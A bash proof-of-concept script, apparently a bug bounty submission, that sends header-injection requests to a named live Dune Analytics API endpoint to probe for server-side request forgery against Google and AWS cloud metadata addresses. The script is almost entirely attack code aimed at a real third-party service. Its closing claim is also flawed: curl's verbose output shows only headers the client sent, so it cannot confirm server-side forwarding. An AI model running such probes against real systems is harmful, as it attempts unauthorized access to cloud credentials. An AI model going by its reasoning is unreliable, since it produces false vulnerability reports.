#!/bin/bash
# DUNE ANALYTICS, BUG BOUNTY PoC
# Finding: SSRF via Arbitrary Header Injection (sim-proxy)
# Severity: HIGH 

TARGET="https://api.sim.dune.com/v1/"

# Header
echo -e "\033[0;34m[+] Initializing SSRF Header Injection Audit...\033[0m"
echo -e "\033[0;34m[*] Target: $TARGET\033[0m"
echo -e "\033[0;34m[*] Audit Focus: Blind header forwarding in sim-proxy service.\033[0m\n"

# Execution: Host Header Injection and Metadata Probing
# We use verbose mode (-v) to capture the exact headers sent to the server.
curl -v -s "$TARGET" \
  -H "Host: metadata.google.internal" \
  -H "X-Forwarded-For: http://169.254.169.254/latest/meta-data/" \
  -H "X-Real-IP: 1.2.3.4" 2>&1 | grep -E "> GET|> Host|> X-Forwarded|> X-Real"

echo -e "\n\033[1;33m[Technical Conclusion]\033[0m"
echo "If the log above confirms that 'Host: metadata.google.internal' was successfully transmitted,"
echo "it validates that sim-proxy performs unsanitized blind-forwarding of client headers."
echo "This confirms the vulnerability identified in the source code analysis (Object.fromEntries)."
